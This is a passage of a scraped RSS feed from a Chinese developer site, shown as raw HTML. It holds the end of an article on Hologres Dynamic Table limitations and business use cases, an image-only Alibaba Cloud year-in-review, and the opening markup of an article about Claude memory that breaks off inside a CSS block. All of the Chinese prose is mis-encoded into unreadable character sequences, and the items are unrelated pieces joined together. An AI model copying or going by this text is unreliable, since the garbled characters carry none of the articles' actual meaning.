<p>ä¸æ”¯æŒçš„åœºæ™¯ï¼š<br/>
çª—å£å‡½æ•°<br/>
INå­æŸ¥è¯¢<br/>
EXISTSæˆ–NOTEXISTS<br/>
EXCEPTæˆ–INTERSECT<br/>
ORDERBY<br/>
LIMITæˆ–OFFSET</p>
</li>
<li>
<p>Streamæ¨¡å¼åŸºè¡¨åªèƒ½æ˜¯åˆ—å­˜è¡¨</p>
</li>
<li>
<p>è‹¥ä¸Šæ¸¸è¡¨ä¸ºåˆ†åŒºè¡¨ï¼Œ<strong>æ— æ³•</strong>åŒæ—¶<strong>æ¶ˆè´¹</strong>ä¸Šæ¸¸è¡¨çš„<strong>å¤šä¸ªåˆ†åŒº</strong>ã€‚</p>
</li>
<li>
<p>ä»…æ”¯æŒæŠŠåˆ·æ–°æ¨¡å¼ä»å¢é‡æ”¹ä¸ºå…¨é‡ï¼Œä¸æ”¯æŒä»å…¨é‡æ”¹ä¸ºå¢é‡</p>
</li>
</ul>
<p>â€¢ èµ„æºæ¶ˆè€—å¤§</p>
<h2 data-id="heading-2">ä¸šåŠ¡å®è·µ</h2>
<h3 data-id="heading-3">æ•°æ®åœˆé€‰</h3>
<h4 data-id="heading-4">ä¸šåŠ¡èƒŒæ™¯</h4>
<p>ä»·æ ¼åŠ›å›¢é˜Ÿéœ€è¦ä¸ºå¤šä¸ªä¸šåŠ¡åœºæ™¯å¦‚å•†å“ä»·æ ¼å›æ»šã€å…¨ç½‘æ¯”ä»·ç­‰æä¾›<strong>çµæ´»çš„æ•°æ®åœˆé€‰èƒ½åŠ›</strong>ï¼Œè¦æ±‚æ”¯æŒåŠ¨æ€çš„æŒ‡æ ‡ç»„åˆå’Œç­›é€‰æ¡ä»¶é…ç½®ã€‚åœˆé€‰é›†åˆ›å»ºåï¼Œåœˆé€‰ç»“æœä¹Ÿéœ€è¦éšåº•è¡¨æ•°æ®çš„å˜åŒ–è€Œå˜åŠ¨ï¼Œä¸åŒä¸šåŠ¡åœºæ™¯å¯æ¥å—çš„æ•°æ®å˜åŒ–æ—¶é—´é—´éš”ä¹Ÿæœ‰æ‰€ä¸åŒã€‚</p>
<h4 data-id="heading-5">è§£å†³æ–¹æ¡ˆ</h4>
<p>Dynamic Tableå®Œç¾ç¬¦åˆåœºæ™¯è¦æ±‚ï¼šå·¥ç¨‹åŸºäºä¸åŒçš„ç­›é€‰è§„åˆ™ç¿»è¯‘æˆç›¸åº”çš„DQLï¼Œå¹¶æ ¹æ®ä¸šåŠ¡åœºæ™¯çš„éœ€æ±‚çµæ´»è®¾ç½®æ•°æ®æ–°é²œåº¦ç­‰é…ç½®å‚æ•°ï¼Œæœ€ç»ˆç”Ÿæˆå®Œæ•´çš„Dynamic Table DDLã€‚</p>
<p><strong>æŒ‡æ ‡ç³»ç»Ÿï¼š</strong> æŒ‡æ ‡ç³»ç»Ÿä¸­å°†<strong>è¡¨åˆ—</strong>é…ç½®ä¸ºå®ä½“æŒ‡æ ‡ã€‚ä¸šåŠ¡æŒ‡æ ‡æä¾›é«˜é˜¶èƒ½åŠ›å¦‚çº§è”æŒ‡æ ‡ã€èšåˆã€å¬å›è®¡ç®—ã€‚</p>
<p><strong>ç­›é€‰ç»„ä»¶ï¼š</strong> æä¾›é€šç”¨ç­›é€‰é…ç½®ç»„ä»¶ï¼Œæ ¹æ®<strong>ä¸šåŠ¡åœºæ™¯</strong>å±•ç¤ºç›¸åº”æŒ‡æ ‡</p>
<p><strong>ä¸šåŠ¡åœºæ™¯é»˜è®¤é…ç½®ï¼šDiamondä¸­ä¿å­˜ä¸åŒä¸šåŠ¡åœºæ™¯é»˜è®¤é…ç½®</strong>ï¼ŒåŒ…æ‹¬åˆ·æ–°å‘¨æœŸã€åˆ·æ–°æ¨¡å¼ã€é»˜è®¤å¬å›æ¡ä»¶ã€é»˜è®¤Joinæ¡ä»¶ç­‰</p>
<p><strong>DDLç”Ÿæˆï¼š</strong> å°†ç­›é€‰æ¡ä»¶ä¸é»˜è®¤æ¡ä»¶é€šè¿‡<strong>DSL</strong>ç¿»è¯‘ä¸ºHologres Dynamic Table DDL</p>
<p><strong>çŠ¶æ€ç›‘æ§ï¼š</strong> å®ç°åˆ·æ–°çŠ¶æ€æ£€æŸ¥æœºåˆ¶ï¼Œå®šæœŸæ£€æŸ¥åŠ¨æ€è¡¨åˆ·æ–°çŠ¶æ€ï¼ŒåŒºåˆ†<strong>æœªå®Œæˆåˆ·æ–°</strong>å’Œ<strong>åˆ·æ–°åæ— æ•°æ®</strong>ä¸¤ç§æƒ…å†µ</p>
<p><strong>æ•°æ®ä¾›ç»™ï¼šåŠ¨æ€è¡¨ç¬¬ä¸€æ¬¡åˆ·æ–°å®Œæˆåï¼Œæä¾›Flink</strong>å’Œ<strong>åˆ†é¡µæŸ¥è¯¢</strong>ä¸¤ç§æ•°æ®ä¾›ç»™æ–¹å¼ã€‚è‹¥é€‰æ‹©Flinkï¼Œåœ¨åŠ¨æ€è¡¨åˆ›å»ºå®Œæˆåä¼šè‡ªåŠ¨æ ¹æ®é»˜è®¤æ¡ä»¶åˆ›å»ºFlinkä»»åŠ¡ï¼Œé€šå¸¸æŠŠæ•°æ®å˜æ›´ä½œä¸ºæ¶ˆæ¯å‘é€ç»™MetaQã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a52ab546667441728c0d63bb0a067cd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=h%2B2AJDYsX86DIRsgau1xhK15ScI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">åº”ç”¨æ•ˆæœ</h4>
<p>è¯¥æ–¹æ¡ˆå¯åœ¨<strong>ç§’çº§</strong>ä»<strong>äº¿çº§</strong>æ•°æ®åŸºè¡¨ä¸­å®ŒæˆDynamic Tableåˆ›å»ºåŠåˆæ¬¡æ•°æ®åˆ·æ–°ï¼Œå·²åœ¨ä»·æ ¼åŠ›å›¢é˜Ÿå¤šä¸ªä¸šåŠ¡åœºæ™¯ä¸­éƒ¨ç½²åº”ç”¨ï¼Œæ˜¾è‘—æå‡äº†æ•°æ®åœˆé€‰çš„çµæ´»æ€§å’Œæ•ˆç‡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d37e98895994bac9eaa113923fdfc09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=7XI1jHgiGALTgo2ZbvpSrGkSyaU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6560c040b15b4ab08c681b7d4d972736~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=GtPtU9Scu4x9pkTbt2cDNonSqY8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f3b61e853424b6aa4970d788d4f9bb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=%2BagDyfuFOIjfPYjluI1mxdGCe%2FE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">è¿‘å®æ—¶æŠ¥è¡¨æ„å»º</h3>
<h4 data-id="heading-8">ä¸šåŠ¡èƒŒæ™¯</h4>
<p>æ•°æ®çœ‹æ¿çš„æ—¶æ•ˆæ€§è¶Šé«˜ï¼Œè¶Šèƒ½å¸®åŠ©è¿è¥åŠæ—¶å‘ç°é—®é¢˜ï¼Œå¿«é€Ÿè¿›è¡Œå†³ç­–å’Œä¸šåŠ¡è°ƒæ•´ã€‚ä»·æ ¼åŠ›å›¢é˜Ÿå†…éƒ¨åˆ†åœºæ™¯çš„æŠ¥è¡¨æ•°æ®åŸé€šè¿‡ODPSç¦»çº¿è°ƒåº¦å®ç°æ›´æ–°ï¼Œä½†è¿è¥æœŸæœ›èƒ½æœ‰è¿‘å®æ—¶åˆ†é’Ÿçº§æ•°æ®ã€‚</p>
<h4 data-id="heading-9">è§£å†³æ–¹æ¡ˆ</h4>
<p><strong>æ•°æ®åˆ†å±‚æ„å»ºï¼š</strong> åŸºäºHologres Dynamic Tableå®ç°ODS â†’ DWD â†’ DWS â†’ ADSæ•°æ®æ¶æ„çš„è¿‘å®æ—¶åŒ–æ”¹é€ </p>
<p><strong>å¢é‡åˆ·æ–°ç­–ç•¥ï¼š</strong> é‡‡ç”¨åŠ¨æ€è¡¨<strong>å¢é‡åˆ·æ–°</strong>æœºåˆ¶ï¼Œè®¾ç½®<strong>åˆ†é’Ÿçº§</strong>åˆ·æ–°é—´éš”ï¼Œå®ç°è¿‘å®æ—¶æ•°æ®æ›´æ–°ï¼Œå¹¶<strong>åˆ†é’Ÿçº§ä¿å­˜å†å²æ•°æ®</strong>ã€‚</p>
<p><strong>èµ„æºéš”ç¦»ä¿éšœï¼š</strong> é€šè¿‡ä½¿ç”¨Hologres <strong>Serverless</strong>èµ„æºå‡å°‘ä¸å…¶ä»–ä»»åŠ¡çš„èµ„æºç«äº‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87b86b760474381b4c44f16a4691658~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=tU4pln1t58DhWXq6Z%2BdFGeR65W0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10">åº”ç”¨æ•ˆæœ</h4>
<p><strong>åº”ç”¨æ•ˆæœï¼š</strong> æˆåŠŸè§£å†³äº†æ•°æ®çœ‹æ¿çš„æ—¶æ•ˆæ€§ç—›ç‚¹ï¼Œ<strong>äº¿çº§åº•è¡¨æ•°æ®ï¼Œè¾“å…¥RPS 1W</strong>çš„å¤„ç†æ—¶å»¶ä»<strong>å°æ—¶çº§é™ä½è‡³åˆ†é’Ÿçº§</strong>ï¼Œå¯ä»¥çµæ´»æ¯”å¯¹<strong>ä»»æ„åˆ†é’Ÿæ•°æ®çš„åŒæ¯”</strong>ï¼ŒåŒåä¸€æœŸé—´ä¸ºè¿è¥å›¢é˜Ÿæä¾›äº†åŠæ—¶å¯é çš„æ•°æ®æ”¯æ’‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bcd8de4380d4603a3e899e73abeef32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=8wsdzhxait7Ayd%2FYq2LIz4GcWcQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d182719d1544b6852b2b375c970461~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509522&amp;x-signature=f%2FDXIcScPGHFYyAVEGk%2Fgh8B0zI%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº‘åŸç”Ÿä¸ºåŸºï¼ŒAIä¸ºç¿¼ï¼šå›æœ›é˜¿é‡Œäº‘äº‘åŸç”Ÿçš„2025å¹´]]></title>    <link>https://juejin.cn/post/7597250364124938303</link>    <guid>https://juejin.cn/post/7597250364124938303</guid>    <pubDate>2026-01-20T10:30:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597250364124938303" data-draft-id="7597271614941626387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº‘åŸç”Ÿä¸ºåŸºï¼ŒAIä¸ºç¿¼ï¼šå›æœ›é˜¿é‡Œäº‘äº‘åŸç”Ÿçš„2025å¹´"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2026-01-20T10:30:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº‘åŸç”Ÿä¸ºåŸºï¼ŒAIä¸ºç¿¼ï¼šå›æœ›é˜¿é‡Œäº‘äº‘åŸç”Ÿçš„2025å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:30:07.000Z" title="Tue Jan 20 2026 10:30:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7458501d8f5b471f8f70e779cf3ef2d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=Zgg4xTH4y6h5WQ8hgei6kPSqAAo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c3cc19ba7e4bd58670827e88eacd8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=BC5PWcJCQBUNlOimpE6x1%2F9H7Og%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a206f69cfa48b2a2883ff274e5cc7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=O03EaG3%2FshyKQtpo1NmpMidVtYM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b1315a17a7f42b19c4b2792a6fd89d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=UUlWhn3qPG1tkOhAsF8sR6K8hmU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67d14f2437d1480e9704e8c6bd9cf428~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=w7%2FM0VBvU3QwfoykqXbYjS%2BLKks%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dc24fa1afd1413981c82c75f6dcfde6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=b9OiEakzHbVacNaspS03vwZ86%2Fs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5868baf86edb4e52a410d5c36e493c1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509806&amp;x-signature=VjTQyFJeh6zVtAyX5uckDknGxRs%3D" alt="å›¾ç‰‡" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆšåˆšï¼ŒClaude å®ç°ã€Œæ°¸ä¹…è®°å¿†ã€ï¼å®˜æ–¹è¿˜æ²¡ä¸Šçº¿ï¼Œå¤§ç¥å·²ç©ç–¯]]></title>    <link>https://juejin.cn/post/7597125475601661979</link>    <guid>https://juejin.cn/post/7597125475601661979</guid>    <pubDate>2026-01-20T10:31:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601661979" data-draft-id="7596998306381840434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆšåˆšï¼ŒClaude å®ç°ã€Œæ°¸ä¹…è®°å¿†ã€ï¼å®˜æ–¹è¿˜æ²¡ä¸Šçº¿ï¼Œå¤§ç¥å·²ç©ç–¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T10:31:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆšåˆšï¼ŒClaude å®ç°ã€Œæ°¸ä¹…è®°å¿†ã€ï¼å®˜æ–¹è¿˜æ²¡ä¸Šçº¿ï¼Œå¤§ç¥å·²ç©ç–¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:31:23.000Z" title="Tue Jan 20 2026 10:31:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol 